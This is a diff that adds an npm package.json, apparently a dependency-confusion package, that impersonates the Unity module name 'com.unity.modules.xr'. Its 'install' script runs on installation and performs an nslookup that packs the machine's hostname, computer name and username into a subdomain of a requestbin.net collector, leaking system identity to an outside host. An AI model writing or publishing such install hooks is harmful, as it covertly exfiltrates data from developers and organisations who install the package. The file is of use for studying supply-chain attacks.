@@ -1,0 +1,11 @@
+{
+  "name": "com.unity.modules.xr",
+  "version": "200.0.6",
+  "description": "com.unity.modules.xr: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.com.unity.modules.xr.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
